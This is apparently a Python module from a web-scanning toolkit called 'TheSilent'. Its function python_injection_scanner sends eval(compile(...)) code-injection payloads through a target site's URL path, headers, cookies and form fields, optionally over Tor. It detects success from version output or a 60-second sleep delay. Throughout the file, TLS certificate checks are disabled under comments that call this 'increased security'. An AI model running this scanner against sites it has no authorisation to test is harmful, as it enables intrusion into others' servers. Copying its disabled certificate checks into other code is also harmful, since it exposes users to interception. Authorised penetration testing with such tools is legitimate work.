import time
import urllib.parse
import re
import requests
from TheSilent.clear import clear
from TheSilent.form_scanner import form_scanner
from TheSilent.return_user_agent import return_user_agent

CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RED = "\033[1;31m"

# create html sessions object
web_session = requests.Session()

tor_proxy = {
    "http": "socks5h://localhost:9050",
    "https": "socks5h://localhost:9050"}

# increased security
requests.packages.urllib3.disable_warnings()
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ":HIGH:!DH:!aNULL"

# increased security
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ":HIGH:!DH:!aNULL"

except AttributeError:
    pass

def python_injection_scanner(url, secure=True, tor=False, delay=1):
    clear()

    if url.startswith("https://") or url.startswith("http://"):
        if url.count("/") == 2:
            if url.endswith("/"):
                my_url = url

            else:
                my_url = url + "/"

        else:
            my_url = url

    else:
        if secure:
            if url.count("/") == 0:
                if url.endswith("/"):
                    my_url = "https://" + url

                else:
                    my_url = "https://" + url + "/"

            else:
                my_url = "https://" + url

        else:
            if url.count("/") == 0:
                if url.endswith("/"):
                    my_url = "http://" + url

                else:
                    my_url = "http://" + url + "/"

            else:
                my_url = "http://" + url

    my_list = []
    init_mal_payloads = [r'eval(compile("import sys\ndef the_silent():\n return sys.version\nprint(the_silent())", "thesilent", "exec"))', r'eval(compile("import sys\ndef the_silent():\n return sys.version\nthe_silent()", "thesilent", "exec"))', r'eval(compile("import time\ntime.sleep(60)", "thesilent", "exec"))']

    # url payloads
    url_mal_payloads = init_mal_payloads[:]
    for mal in init_mal_payloads:
        url_mal_payloads.append("& " + mal + " &")
        url_mal_payloads.append("\\" + mal)
        url_mal_payloads.append("./" + mal)
        url_mal_payloads.append("#" + mal)
        url_mal_payloads.append("\'\'\'" + mal + "\'\'\'")

    new_mal_payloads = url_mal_payloads[:]
    for mal in new_mal_payloads:
        url_mal_payloads.append(mal.upper())

    # other payloads
    other_mal_payloads = init_mal_payloads[:]
    for mal in init_mal_payloads:
        other_mal_payloads.append("& " + mal + " &")
        other_mal_payloads.append("\\" + mal)
        other_mal_payloads.append("# " + mal)
        other_mal_payloads.append("\'\'\'" + mal + "\'\'\'")

    new_mal_payloads = other_mal_payloads[:]
    for mal in new_mal_payloads:
        other_mal_payloads.append(mal.upper())

    # check for python injection in url
    for mal in url_mal_payloads:
        time.sleep(delay)
        new_url = my_url + urllib.parse.quote(mal)
        print(CYAN + fr"checking: {new_url}")
        try:
            if tor:
                start = time.time()
                my_request = web_session.get(new_url, verify=False, headers={"User-Agent": return_user_agent()}, proxies=tor_proxy, timeout=(120,180)).text.lower()
                end = time.time()

            else:
                start = time.time()
                my_request = web_session.get(new_url, verify=False, headers={"User-Agent": return_user_agent()}, timeout=(120,180)).text.lower()
                end = time.time()

            alert = False
            if "sys" in mal and "gcc" in my_request:
                print(RED + fr"True: {new_url}")
                my_list.append(new_url)
                alert = True
                break
            
            if "time" in mal and end - start > 45:
                print(RED + fr"True: {new_url}")
                my_list.append(new_url)
                alert = True
                break

            if not alert:
                print(GREEN + fr"False: {new_url}")

        except:
            continue

    # check for python injection in headers
    for mal in other_mal_payloads:
        time.sleep(delay)
        print(CYAN + fr"checking headers: {my_url} {mal}:{mal}")
        try:
            if tor:
                start = time.time()
                my_request = web_session.get(my_url, verify=False, headers={"User-Agent": return_user_agent(), mal:mal}, proxies=tor_proxy, timeout=(120,180)).text.lower()
                end = time.time()

            else:
                start = time.time()
                my_request = web_session.get(my_url, verify=False, headers={"User-Agent": return_user_agent(), mal:mal}, timeout=(120,180)).text.lower()
                end = time.time()

            alert = False
            if "sys" in mal and "gcc" in my_request:
                print(RED + fr"True headers: {my_url} {mal}:{mal}")
                my_list.append(fr"headers: {my_url} {mal}:{mal}")
                alert = True
                break

            if "time" in mal and end - start > 45:
                print(RED + fr"True headers: {my_url} {mal}:{mal}")
                my_list.append(fr"headers: {my_url} {mal}:{mal}")
                alert = True
                break

            if not alert:
                print(GREEN + fr"False headers: {my_url} {mal}:{mal}")

        except:
            continue

    # check for python injection in cookies
    for mal in other_mal_payloads:
        time.sleep(delay)
        print(CYAN + fr"checking cookie: {my_url} {mal}:{mal}")
        try:
            if tor:
                start = time.time()
                my_request = web_session.get(my_url, verify=False, cookies={mal:mal}, headers={"User-Agent": return_user_agent()}, proxies=tor_proxy, timeout=(120,180)).text.lower()
                end = time.time()
                

            else:
                start = time.time()
                my_request = web_session.get(my_url, verify=False, cookies={mal:mal}, headers={"User-Agent": return_user_agent()}, timeout=(120,180)).text.lower()
                end = time.time()

            alert = False
            if "sys" in mal and "gcc" in my_request:
                print(RED + fr"True cookies: {my_url} {mal}:{mal}")
                my_list.append(fr"cookies: {my_url} {mal}:{mal}")
                alert = True
                break

            if "time" in mal and end - start > 45:
                print(RED + fr"True cookies: {my_url} {mal}:{mal}")
                my_list.append(fr"cookies: {my_url} {mal}:{mal}")
                alert = True
                break

            if not alert:
                print(GREEN + fr"False cookies: {my_url} {mal}:{mal}")

        except:
            continue

    # check for python injection in forms
    time.sleep(delay)
    forms = form_scanner(url, secure=secure, tor=tor)
    for mal in other_mal_payloads:
        time.sleep(delay)
        for form in forms:
            try:
                action = re.findall("action=[\"\'](\S+)[\"\']", form)
                action = action[0].lower()
                form_input = re.findall("<input.+>", form)
                method = re.findall("method=[\"\'](\S+)[\"\']", form)
                method = method[0].lower()
                name = re.findall("name=[\"\'](\S+)[\"\']", form)

                if url in action:
                    new_url = my_url

                else:
                    if action.startswith("/"):
                        new_url = my_url + action[1:]

                    else:
                        new_url = my_url + action

                for my_input in form_input:
                    form_type = re.findall("type=[\"\'](\S+)[\"\']", my_input)
                    for my_type in form_type:
                        if my_type == "text" or my_type == "password" or my_type == "search":
                            name = re.findall("name=[\"\'](\S+)[\"\']", form)
                            name = name[0]

                            print(CYAN + fr"checking: forms: {new_url} {name}:{mal}")
                            if method == "get":
                                if tor:
                                    start = time.time()
                                    my_request = web_session.get(new_url, params={name:mal}, verify=False, headers={"User-Agent": return_user_agent()}, proxies=tor_proxy, timeout=(120,180)).text.lower()
                                    end = time.time()

                                else:
                                    start = time.time()
                                    my_request = web_session.get(new_url, params={name:mal}, verify=False, headers={"User-Agent": return_user_agent()}, timeout=(120,180)).text.lower()
                                    end = time.time()
                                        
                            if method == "post":
                                if tor:
                                    start = time.time()
                                    my_request = web_session.post(new_url, data={name:mal}, verify=False, headers={"User-Agent": return_user_agent()}, proxies=tor_proxy, timeout=(120,180)).text.lower()
                                    end = time.time()

                                else:
                                    start = time.time()
                                    my_request = web_session.post(new_url, data={name:mal}, verify=False, headers={"User-Agent": return_user_agent()}, timeout=(120,180)).text.lower()
                                    end = time.time()
        
                alert = False
                if "sys" in mal and "gcc" in my_request:
                    print(RED + fr"True forms: {my_url} {mal}:{mal}")
                    my_list.append(fr"forms: {my_url} {mal}:{mal}")
                    alert = True
                    break

                if "time" in mal and end - start > 45:
                    print(RED + fr"True forms: {my_url} {mal}:{mal}")
                    my_list.append(fr"forms: {my_url} {mal}:{mal}")
                    alert = True
                    break

                if not alert:
                    print(GREEN + fr"False forms: {my_url} {mal}:{mal}")

            except:
                continue

    print(CYAN + "")
    clear()

    my_list.sort()

    return my_list
